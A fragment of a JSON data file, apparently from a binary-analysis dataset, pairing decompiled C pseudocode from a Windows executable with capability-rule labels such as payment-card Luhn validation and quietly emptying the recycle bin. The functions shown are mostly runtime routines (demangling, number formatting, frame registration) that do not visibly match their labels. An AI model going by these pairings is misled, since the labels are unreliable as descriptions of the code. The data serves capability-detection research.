        "decompiled_code": "\nuint fcn.0040e8f0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    \n    pcVar8 = *(in_EAX + 0xc);\n    if (*pcVar8 != 'L') {\n        return 0;\n    }\n    pcVar6 = pcVar8 + 1;\n    *(in_EAX + 0xc) = pcVar6;\n    cVar1 = pcVar8[1];\n    if ((cVar1 == '_') || (cVar1 == 'Z')) {\n        if (cVar1 == '_') {\n            pcVar6 = pcVar8 + 2;\n            *(in_EAX + 0xc) = pcVar6;\n            cVar1 = pcVar8[2];\n            if (cVar1 != 'Z') {\n                uVar4 = 0;\n                goto joined_r0x0040ea0d;\n            }\n        }\n        *(in_EAX + 0xc) = pcVar6 + 1;\n        uVar4 = fcn.00410a50();\n        pcVar6 = *(in_EAX + 0xc);\n        cVar1 = *pcVar6;\n        goto joined_r0x0040ea0d;\n    }\n    piVar3 = fcn.0040f7c0();\n    if (piVar3 == NULL) {\n        return 0;\n    }\n    if ((*piVar3 == 0x27) && (*(piVar3[2] + 0x10) != 0)) {\n        *(in_EAX + 0x2c) = *(in_EAX + 0x2c) - *(piVar3[2] + 4);\n    }\n    pcVar6 = *(in_EAX + 0xc);\n    cVar1 = *pcVar6;\n    pcVar8 = pcVar6;\n    if (cVar1 == 'n') {\n        pcVar8 = pcVar6 + 1;\n        *(in_EAX + 0xc) = pcVar8;\n        cVar1 = pcVar6[1];\n    }\n    pcVar6 = pcVar8;\n    if (cVar1 == 'E') {\n        iVar7 = 0;\n    }\n    else {\n        do {\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            pcVar6 = pcVar6 + 1;\n            *(in_EAX + 0xc) = pcVar6;\n            cVar1 = *pcVar6;\n        } while (cVar1 != 'E');\n        iVar7 = pcVar6 - pcVar8;\n    }\n    iVar2 = *(in_EAX + 0x14);\n    if (iVar2 < *(in_EAX + 0x18)) {\n        puVar5 = iVar2 * 0x10 + *(in_EAX + 0x10);\n        puVar5[1] = 0;\n        *(in_EAX + 0x14) = iVar2 + 1;\n        if ((pcVar8 == NULL) || (iVar7 == 0)) goto code_r0x0040ea60;\n        puVar5[1] = 0;\n        *puVar5 = 0;\n        puVar5[2] = pcVar8;\n        puVar5[3] = iVar7;\n    }\n    else {\ncode_r0x0040ea60:\n        puVar5 = NULL;\n    }\n    uVar4 = fcn.0040df00(puVar5);\n    pcVar6 = *(in_EAX + 0xc);\n    cVar1 = *pcVar6;\njoined_r0x0040ea0d:\n    if (cVar1 != 'E') {\n        return 0;\n    }\n    *(in_EAX + 0xc) = pcVar6 + 1;\n    return uVar4;\n}\n",
        "token_count": 890
    },
    "004a36d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nuint32_t fcn.004a36d0(uint32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    char cVar6;\n    uint32_t **ppuVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint uVar10;\n    int32_t *piVar11;\n    int32_t iVar12;\n    code *pcVar13;\n    ulong uVar14;\n    int32_t iStack68;\n    uint32_t *puStack40;\n    \n    ppuVar7 = fcn.004a3950();\n    puVar2 = *ppuVar7;\n    puVar1 = param_1 + -0xc;\n    iVar12 = param_1[1] + 0xb8b1aabc + (0x432b2aff < *param_1);\n    if (iVar12 == 0 && (1 < *param_1 + 0xbcd4d500) <= -iVar12) {\n        uVar3 = param_1[-7];\n        uVar5 = -uVar3;\n        if (-1 < uVar3) {\n            uVar5 = uVar3;\n        }\n        param_1[-7] = uVar5 + 1;\n        ppuVar7[1] = ppuVar7[1] + -1;\n        if (puVar2 != puVar1) {\n            param_1[-8] = puVar2;\n            *ppuVar7 = puVar1;\n        }\n        return param_1[-2];\n    }\n    if (puVar2 == NULL) {\n        *ppuVar7 = puVar1;\n        return 0;\n    }\n    fcn.004a0230();\n    if ((puStack40 == NULL) ||\n       (fcn.004a36d0(puStack40),  iVar12 = puStack40[1] + 0xb8b1aabc + (0x432b2aff < *puStack40), \n       iVar12 != 0 || -iVar12 < (1 < *puStack40 + 0xbcd4d500))) {\n        fcn.004a0230();\n    }\n    fcn.00428a40(puStack40[-9]);\n    fcn.004a36d0(iStack68);\n    uVar10 = *(iStack68 + -0x18);\n    uVar4 = *(iStack68 + -0x24);\n    uVar8 = fcn.00428a60(*(iStack68 + -0x28));\n    fcn.004a36d0(uVar8);\n    fcn.004a3970();\n    while( true ) {\n        fcn.00428700();\n        cVar6 = fcn.004287e0(uVar10);\n        if (cVar6 != '\\0') break;\n        cVar6 = fcn.004287e0(uVar10);\n        if (cVar6 != '\\0') goto code_r0x004a4f72;\n        fcn.00428a40(uVar4);\n    }\n    fcn.004a3b60();\ncode_r0x004a4f72:\n    puVar9 = fcn.004a3610(4);\n    *puVar9 = 0x50a974;\n    fcn.004a3bc0(puVar9, 0x5071f8, 0x476a20);\n    uVar10 = sub.msvcrt.dll_abort();\n    fcn.004a36d0(uVar10);\n    uVar14 = sub.msvcrt.dll_abort();\n    fcn.004a3840();\n    pcVar13 = (uVar14 >> 0x20) + 1;\n    if (pcVar13 != NULL) {\n        fcn.0041b360(uVar14);\n    }\n    uVar14 = fcn.004a37a0();\n    uVar10 = uVar14;\n    if (uVar14 >> 0x20 != 1) goto code_r0x004a5051;\n    piVar11 = fcn.004a36d0(uVar10);\n    uVar10 = (**(*piVar11 + 8))();\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fwrite(\"  what():  \", 1, 0xb, uVar8);\n    uVar8 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputs(uVar10, uVar8);\n    uVar10 = (*pcVar13)(2);\n    sub.msvcrt.dll_fputc(10, uVar10);\n    fcn.004a3840();\n    do {\n        sub.msvcrt.dll_abort();\n        uVar10 = uVar4;\n        fcn.00427908(uVar4);\n        fcn.004a3b60();\ncode_r0x004a5051:\n        fcn.004a36d0(uVar10);\n        fcn.004a3840();\n    } while( true );\n}\n",
        "token_count": 1124
    },
    "0040e270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint * fcn.0040e270(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_EAX;\n    int32_t iVar6;\n    uint *puVar7;\n    \n    iVar6 = fcn.0040e0d0();\n    if (iVar6 < 1) {\n        return NULL;\n    }\n    piVar3 = *(in_EAX + 0xc);\n    if (iVar6 <= *(in_EAX + 4) - piVar3) {\n        pcVar1 = piVar3 + iVar6;\n        *(in_EAX + 0xc) = pcVar1;\n        if (((*(in_EAX + 8) & 4) != 0) && (*pcVar1 == '$')) {\n            *(in_EAX + 0xc) = pcVar1 + 1;\n        }\n        iVar4 = *(in_EAX + 0x14);\n        iVar5 = *(in_EAX + 0x18);\n        if (iVar6 < 10) {\n            if (iVar4 < iVar5) {\n                puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                puVar7[1] = 0;\n                *(in_EAX + 0x14) = iVar4 + 1;\n                if (piVar3 != NULL) goto code_r0x0040e2ef;\n            }\n        }\n        else {\n            if ((*piVar3 == 0x4f4c475f) && (piVar3[1] == 0x5f4c4142)) {\n                cVar2 = *(piVar3 + 2);\n                if (((cVar2 == '.' || cVar2 == '_') || (cVar2 == '$')) && (*(piVar3 + 9) == 'N')) {\n                    *(in_EAX + 0x2c) = (*(in_EAX + 0x2c) + 0x16) - iVar6;\n                    if (iVar4 < iVar5) {\n                        puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                        *(in_EAX + 0x14) = iVar4 + 1;\n                        puVar7[1] = 0;\n                        *puVar7 = 0;\n                        puVar7[2] = \"(anonymous namespace)\";\n                        puVar7[3] = 0x15;\n                        goto code_r0x0040e302;\n                    }\n                    goto code_r0x0040e336;\n                }\n            }\n            if (iVar4 < iVar5) {\n                puVar7 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                puVar7[1] = 0;\n                *(in_EAX + 0x14) = iVar4 + 1;\ncode_r0x0040e2ef:\n                puVar7[1] = 0;\n                *puVar7 = 0;\n                puVar7[2] = piVar3;\n                puVar7[3] = iVar6;\n                goto code_r0x0040e302;\n            }\n        }\n    }\ncode_r0x0040e336:\n    puVar7 = NULL;\ncode_r0x0040e302:\n    *(in_EAX + 0x28) = puVar7;\n    return puVar7;\n}\n",
        "token_count": 763
    },
    "0040e6e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint fcn.0040e6e0(void)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    if (*pcVar1 != '_') {\n        return 1;\n    }\n    *(in_EAX + 0xc) = pcVar1 + 1;\n    if (pcVar1[1] == '_') {\n        *(in_EAX + 0xc) = pcVar1 + 2;\n        iVar2 = fcn.0040e0d0();\n        if (iVar2 < 0) {\n            return 0;\n        }\n        if (9 < iVar2) {\n            if (**(in_EAX + 0xc) != '_') {\n                return 0;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        }\n    }\n    else {\n        iVar2 = fcn.0040e0d0();\n        if (iVar2 < 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 250
    },
    "00410270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nint32_t fcn.00410270(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    char *pcVar3;\n    int32_t *piVar4;\n    int32_t aiStack32 [4];\n    \n    pcVar3 = *(in_EAX + 0xc);\n    aiStack32[0] = 0;\n    cVar2 = *pcVar3;\n    if ((cVar2 != 'E' && cVar2 != '\\0') && (piVar4 = aiStack32,  cVar2 != '.')) {\n        while (((cVar2 != 'R' && (cVar2 != 'O')) || (pcVar3[1] != 'E'))) {\n            iVar1 = fcn.0040f7c0();\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar1 = fcn.0040df00(0);\n            *piVar4 = iVar1;\n            if (iVar1 == 0) {\n                return 0;\n            }\n            pcVar3 = *(in_EAX + 0xc);\n            piVar4 = iVar1 + 0xc;\n            cVar2 = *pcVar3;\n            if ((cVar2 == '\\0' || cVar2 == 'E') || (cVar2 == '.')) break;\n        }\n        if (aiStack32[0] != 0) {\n            if (*(aiStack32[0] + 0xc) != 0) {\n                return aiStack32[0];\n            }\n            if (**(aiStack32[0] + 8) == 0x27) {\n                iVar1 = (*(aiStack32[0] + 8))[2];\n                if (*(iVar1 + 0x10) == 9) {\n                    *(in_EAX + 0x2c) = *(in_EAX + 0x2c) - *(iVar1 + 4);\n                    *(aiStack32[0] + 8) = 0;\n                    return aiStack32[0];\n                }\n                return aiStack32[0];\n            }\n            return aiStack32[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 484
    },
    "00420c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420c50(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint16_t auStack34 [7];\n    uint uStack20;\n    \n    iVar4 = 6;\n    uStack20 = 0;\n    do {\n        while (uVar1 = *(param_2 + 4 + iVar4 * 2),  uVar1 != 0) {\n            uVar2 = uVar1 * (in_EAX & 0xffff);\n            uVar5 = (uVar2 & 0xffff) + auStack34[iVar4 + 2];\n            auStack34[iVar4 + 2] = uVar5;\n            iVar3 = (uVar2 >> 0x10) + auStack34[iVar4 + 1] + (uVar5 >> 0x10);\n            auStack34[iVar4 + 1] = iVar3;\n            auStack34[iVar4] = iVar3 >> 0x10;\n            iVar4 = iVar4 + -1;\n            if (iVar4 == 0) goto code_r0x00420cb9;\n        }\n        auStack34[iVar4] = 0;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\ncode_r0x00420cb9:\n    iVar4 = 2;\n    do {\n        *(param_1 + iVar4 * 2) = auStack34[iVar4];\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 9);\n    return;\n}\n",
        "token_count": 383
    },
    "004231b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nvoid fcn.004231b0(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t *puVar10;\n    int16_t iVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint32_t uStack136;\n    uint8_t *puStack124;\n    uint32_t uStack120;\n    uint16_t uStack116;\n    uint32_t uStack108;\n    uint32_t uStack104;\n    uint16_t uStack84;\n    uint8_t uStack52;\n    uint8_t auStack51 [35];\n    \n    if (((param_1 != 0) << 10 | (param_1 == 0) << 0xe) == 0x100) {\n        fcn.00422260();\n        return;\n    }\n    uStack84 = param_1 >> 0x40;\n    if (param_1 < 0) {\n        *(in_EAX + 4) = *(in_EAX + 4) | 0x80;\n    }\n    if (((param_1 != 0) << 10 | (param_1 == 0) << 0xe) == 0x500) {\n        fcn.00422260();\n        return;\n    }\n    uStack116 = uStack84 & 0x7fff;\n    uStack108 = SUB104(param_1, 0);\n    uStack104 = param_1 >> 0x20;\n    if ((param_1 & 0x7fff) == 0) {\n        uStack136 = uStack104;\n        if ((uStack104 | uStack108) == 0) {\n            uVar9 = *(in_EAX + 0xc);\n            if (0xe < uVar9) {\n                uStack120 = *(in_EAX + 4);\n                goto code_r0x00423400;\n            }\n            do {\n                uStack104 = uStack104 << 1 | uStack108 >> 0x1f;\n                uStack108 = uStack108 * 2;\njoined_r0x00423296:\n                uStack136 = uStack104;\n            } while (-1 < uStack104);\ncode_r0x004232b1:\n            uVar8 = (0xe - uVar9) * 4;\n            uVar6 = uVar8;\n            uVar7 = uVar6 & 0x1f;\n            uVar3 = 4 << (uVar6 & 0x1f);\n            uVar4 = uVar3;\n            uVar13 = 0 << uVar7 | 4U >> 0x20 - uVar7;\n            if ((uVar8 & 0x20) != 0) {\n                uVar4 = 0;\n                uVar13 = uVar3;\n            }\n            uVar8 = uStack108 >> 1 | uStack136 << 0x1f;\n            uVar3 = uVar8 + uVar4;\n            uVar13 = (uStack136 >> 1) + uVar13 + CARRY4(uVar8, uVar4);\n            if (uVar13 < 0) {\n                uStack116 = uStack116 + 1;\n            }\n            else {\n                uVar13 = uVar13 * 2 | uVar3 >> 0x1f;\n                uVar3 = uVar3 * 2;\n            }\n            uVar9 = (0xf - uVar9) * 4;\n            uVar6 = uVar9;\n            uVar7 = uVar6 & 0x1f;\n            uVar4 = uVar13 >> (uVar6 & 0x1f);\n            uStack108 = uVar3 >> uVar7 | uVar13 << 0x20 - uVar7;\n            uStack136 = uVar4;\n            if ((uVar9 & 0x20) != 0) {\n                uStack136 = 0;\n                uStack108 = uVar4;\n            }\n        }\n        else {\n            if (uStack104 < 0) {\n                uStack116 = 0xc002;\n            }\n            else {\n                uVar2 = 0xc001;\n                do {\n                    uStack116 = uVar2;\n                    uStack104 = uStack104 << 1 | uStack108 >> 0x1f;\n                    uStack108 = uStack108 * 2;\n                    uStack136 = uStack104;\n                    uVar2 = uStack116 - 1;\n                } while (-1 < uStack104);\n            }\n            uVar9 = *(in_EAX + 0xc);\n            if (uVar9 < 0xf) goto code_r0x004232b1;\n        }\n        uStack120 = *(in_EAX + 4);\ncode_r0x00423319:\n        puVar10 = &uStack52;\n        do {\n            uVar9 = uStack108 & 0xf;\n            if ((uVar9 ^ uStack108 | uStack136) == 0) {\n                if (((&uStack52 < puVar10) || ((uStack120 & 0x800) != 0)) || (0 < *(in_EAX + 0xc))) {\n                    *puVar10 = 0x2e;\n                    puVar10 = puVar10 + 1;\n                }\n                uVar13 = uVar9;\n                if ((uStack108 ^ 1 | uStack136) == 0) {\n                    uStack108 = 0;\n                    uStack136 = 0;\n                }\n                else {\n                    do {\n                        uStack116 = uStack116 - 1;\n                        uVar13 = uVar13 >> 1;\n                    } while (uVar13 != 1);\n                    uStack108 = 0;\n                    uStack136 = 0;\n                }\n            }\n            else {\n                uStack108 = uStack108 >> 4 | uStack136 << 0x1c;\n                uStack136 = uStack136 >> 4;\n                if (0 < *(in_EAX + 0xc)) {\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n                }\n            }\n            if (uVar9 == 0) {\n                uVar9 = 0;\n                if ((&uStack52 < puVar10) || (-1 < *(in_EAX + 0xc))) goto code_r0x00423362;\n            }\n            else {\n                if (uVar9 < 10) {\ncode_r0x00423362:\n                    uVar7 = uVar9 + 0x30;\n                }\n                else {\n                    uVar7 = uVar9 + 0x37U | uStack120 & 0x20;\n                }\n                *puVar10 = uVar7;\n                puVar10 = puVar10 + 1;\n            }\n        } while ((uStack136 | uStack108) != 0);\n        if (puVar10 != &uStack52) {\n            iVar1 = *(in_EAX + 8);\n            goto joined_r0x00423666;\n        }\n    }\n    else {\n        uVar9 = *(in_EAX + 0xc);\n        uStack116 = uStack116 + 0xc001;\n        uStack136 = uStack104;\n        if (uVar9 < 0xf) goto joined_r0x00423296;\n        uStack120 = *(in_EAX + 4);\n        if ((uStack104 | uStack108) != 0) goto code_r0x00423319;\n    }\ncode_r0x00423400:\n    puStack124 = &uStack52;\n    if ((0 < *(in_EAX + 0xc)) || ((uStack120 & 0x800) != 0)) {\n        puStack124 = auStack51;\n        uStack52 = 0x2e;\n    }\n    puVar10 = puStack124 + 1;\n    *puStack124 = 0x30;\n    iVar1 = *(in_EAX + 8);\njoined_r0x00423666:\n    if (iVar1 < 1) {\n        iVar5 = uStack116;\n        iVar12 = 2;\n    }\n    else {\n        puStack124 = &uStack52;\n        iVar5 = uStack116;\n        iVar14 = puVar10 - puStack124;\n        if (0 < *(in_EAX + 0xc)) {\n            iVar14 = (puVar10 - puStack124) + *(in_EAX + 0xc);\n        }\n        iVar14 = iVar14 + 5 + ((uStack120 & 0x1c0) != 0);\n        iVar12 = iVar5 / 10;\n        if (iVar12 == 0) {\n            iVar12 = 2;\n        }\n        else {\n            iVar11 = 2;\n            do {\n                iVar14 = iVar14 + 1;\n                iVar11 = iVar11 + 1;\n                iVar12 = iVar12 / 10;\n            } while (iVar12 != 0);\n            iVar12 = iVar11;\n        }\n        if (iVar14 < iVar1) {\n            if ((uStack120 & 0x600) == 0) {\n                *(in_EAX + 8) = (iVar1 - iVar14) + -1;\n                do {\n                    fcn.00421fc0(iVar5);\n                    iVar1 = *(in_EAX + 8);\n                    *(in_EAX + 8) = iVar1 + -1;\n                } while (0 < iVar1);\n                uStack120 = *(in_EAX + 4);\n            }\n            else {\n                *(in_EAX + 8) = iVar1 - iVar14;\n            }\n        }\n        else {\n            *(in_EAX + 8) = 0xffffffff;\n        }\n    }\n    if ((uStack120 & 0x80) == 0) {\n        if ((uStack120 & 0x100) == 0) {\n            if ((uStack120 & 0x40) != 0) {\n                fcn.00421fc0(iVar5);\n            }\n        }\n        else {\n            fcn.00421fc0(iVar5);\n        }\n    }\n    else {\n        fcn.00421fc0(iVar5);\n    }\n    puStack124 = &uStack52;\n    fcn.00421fc0(iVar5);\n    fcn.00421fc0();\n    if ((0 < *(in_EAX + 8)) && ((*(in_EAX + 5) & 2) != 0)) {\n        *(in_EAX + 8) = *(in_EAX + 8) + -1;\n        do {\n            fcn.00421fc0();\n            iVar1 = *(in_EAX + 8);\n            *(in_EAX + 8) = iVar1 + -1;\n        } while (0 < iVar1);\n    }\n    if (puStack124 < puVar10) {\n        do {\n            puVar10 = puVar10 + -1;\n            if (*puVar10 == 0x2e) {\n                fcn.00422300();\n            }\n            else if (*puVar10 == 0x2c) {\n                if (*(in_EAX + 0x1c) != 0) {\n                    fcn.00422020();\n                }\n            }\n            else {\n                fcn.00421fc0();\n            }\n        } while (puVar10 != puStack124);\n    }\n    while (iVar1 = *(in_EAX + 0xc),  *(in_EAX + 0xc) = iVar1 + -1,  0 < iVar1) {\n        fcn.00421fc0();\n    }\n    fcn.00421fc0();\n    *(in_EAX + 8) = *(in_EAX + 8) + iVar12;\n    *(in_EAX + 4) = *(in_EAX + 4) | 0x1c0;\n    fcn.00422820();\n    return;\n}\n",
        "token_count": 2702
    },
    "00429790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint32_t __cdecl fcn.00429790(uint s1, uint32_t arg_ch, uint arg_10h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t aiStack64 [7];\n    uint32_t var_20h;\n    uchar *var_1ch;\n    uint var_ch;\n    \n    aiStack64[0] = 0x4297a6;\n    iVar2 = fcn.00418950();\n    iVar2 = -iVar2;\n    uVar3 = &fcn.00429790::var_20h + iVar2 + 3 & 0xfffffff0;\n    var_20h = uVar3;\n    var_1ch = uVar3 + 0xc;\n    uVar5 = extraout_ECX;\n    puVar4 = var_1ch;\n    do {\n        puVar4 = puVar4 + -1;\n        *puVar4 = *(uVar5 % 10 + 0x502e2d);\n        bVar1 = 9 < uVar5;\n        uVar5 = uVar5 / 10;\n    } while (bVar1);\n    uVar5 = var_1ch - puVar4;\n    if (arg_ch < uVar5) {\n        uVar5 = 0xffffffff;\n    }\n    else {\n        *(&stack0xffffffcc + iVar2) = uVar5;\n        *(&stack0xffffffc8 + iVar2) = (uVar3 - uVar5) + 0xc;\n        *(&stack0xffffffc4 + iVar2) = s1;\n        *(&stack0xffffffc0 + iVar2) = 0x429809;\n        sub.msvcrt.dll_memcpy();\n    }\n    return uVar5;\n}\n",
        "token_count": 444
    },
    "0041ab70": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041ab70(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    code *pcStack52;\n    \n    iVar6 = 1;\n    do {\n        iVar4 = fcn.00419990();\n        uVar5 = in_EAX[4] == *(param_2 + 0x48) + (*(param_2 + 0x60) >> 0x1f);\n        if (iVar4 != 0) {\n            return 2;\n        }\n        if (pcStack52 != NULL) {\n            iVar4 = (*pcStack52)(1, uVar5 << 2 | 2, *in_EAX, in_EAX[1]);\n            if (iVar4 == 7) {\n                *param_1 = iVar6;\n                return 7;\n            }\n            if (iVar4 != 8) {\n                return 2;\n            }\n        }\n        if (uVar5 != 0) {\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar6 == 0) {\n                *0x4ae004 = 0x41ca80;\n                pcVar2 = 0x41c830;\n            }\n            else {\n                *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, \"__register_frame_info\");\n                *0x4ae004 = (*pcVar1)(iVar6, \"__deregister_frame_info\");\n            }\n            if (pcVar2 != NULL) {\n                (*pcVar2)(0x50c0f8, 0x54901c);\n            }\n            uVar3 = fcn.004014c0(fcn.00401590);\n            return uVar3;\n        }\n        iVar6 = iVar6 + 1;\n        fcn.0041ab00();\n    } while( true );\n}\n",
        "token_count": 587
    },
    "0041b2b0": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041b2b0(uint param_1, uint param_2, int32_t param_3, uint param_4, uint param_5)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t extraout_EDX;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack284 [32];\n    uint auStack156 [18];\n    uint uStack84;\n    uint uStack80;\n    int32_t iStack24;\n    uint uStack20;\n    \n    iStack24 = in_EAX;\n    uStack20 = param_2;\n    fcn.0041a910();\n    puVar2 = auStack284;\n    puVar3 = auStack156;\n    for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *(param_3 + 0xc) = param_4;\n    *(param_3 + 0x10) = param_5;\n    iVar1 = fcn.0041ac40();\n    if (iVar1 != 7) {\n        return iVar1;\n    }\n    fcn.0041ad70();\n    fcn.0041b150(uStack84, uStack80);\n    *(&stack0x00000000 + extraout_EDX) = uStack80;\n    return iStack24;\n}\n",
        "token_count": 345
    },
    "0041b360": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041b360(uint param_1, uint param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    ulong uVar6;\n    uint auStack284 [32];\n    uint auStack156 [18];\n    uint uStack84;\n    uint uStack80;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack24 = in_EAX;\n    uStack20 = param_2;\n    fcn.0041a910();\n    puVar4 = auStack284;\n    puVar5 = auStack156;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    if (*(param_3 + 0xc) == 0) {\n        iVar3 = fcn.0041ab70();\n    }\n    else {\n        iVar3 = fcn.0041ac40();\n    }\n    if (iVar3 == 7) {\n        fcn.0041ad70();\n        uVar6 = fcn.0041b150(uStack84, uStack80);\n        *(&stack0x00000000 + uVar6) = uVar6 >> 0x20;\n        return CONCAT44(uStack20, uStack24);\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar2 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x50c0f8, 0x54901c);\n    }\n    uVar6 = fcn.004014c0(fcn.00401590);\n    return uVar6;\n}\n",
        "token_count": 618
    },
    "0041b400": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
